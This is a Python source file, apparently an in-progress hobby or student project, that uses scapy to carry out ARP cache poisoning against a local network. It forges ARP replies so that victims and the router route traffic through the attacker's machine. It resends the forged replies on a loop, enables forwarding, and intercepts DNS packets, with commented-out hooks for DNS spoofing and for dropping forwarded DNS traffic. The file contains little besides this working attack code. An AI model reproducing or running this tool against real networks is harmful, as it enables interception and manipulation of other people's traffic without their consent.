from scapy.all import *
from Forward import *
from DNS import *
import threading

def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
	return Ether(dst=rcv_mac) / ARP(
		op=2,
		psrc=res_ip,
		pdst=rcv_ip,
		hwsrc=res_mac,
		hwdst=rcv_mac
	)
	
def poison_loop(packets, interface, interval):
	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
	while True:
		sendp(packets, iface=interface)
		time.sleep(interval)
	
def start_arp_mitm(victims, self_mac, interface):
	# create a list of each forged response,
	# so each victim gets all other victims spoofed with the mac of this device
	forged_responses = [
		forge_arp_response(ip1, mac1, ip2, self_mac)
		for (ip1, mac1) in victims
		for (ip2, mac2) in victims
		if (ip1, mac1) != (ip2, mac2)
	]

	thread = threading.Thread(target=poison_loop, args=(forged_responses, interface, 20), daemon=True) # todo add ways to customise intervals / interfaces

	thread.start()

	return thread

	# todo find good timings for sending poison/stealth mode(?) (base on OS?)

    
def stop_arp_mitm(thread):
	thread._delete()
	
def only_dns(pkt):
	return pkt.haslayer(DNS)

def print_fn(pkt, ips, interface):
	print(f"src: {pkt[Ether].src}")
	print(f"summary: {pkt.summary()}")
	# spoof_dns(pkt, victim_ip, router_ip, interface)
	
def start_attack(victims, self_ip, self_mac, interface):
	enable_kernel_forwarding(interface)

	thread = start_arp_mitm(victims, self_mac, interface)
		
	# Temp: make this function later	
	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
		
	intercept_pkts(victims, self_mac, interface, only_dns, print_fn)

	input("\nstop")

	stop_arp_mitm(thread)
	cleanup_forward(interface)

# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:d8:3b:bf"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:87:40:17"
self_ip = "192.168.1.100"
self_mac = "00:0c:29:ef:9c:1d"
interface = "eth0"
victims = [(victim_ip, victim_mac), (router_ip, router_mac)]

# start the attack with the placeholder values to avoid having to go through discovery every time for testing
# start_attack(victims, self_ip, self_mac, interface)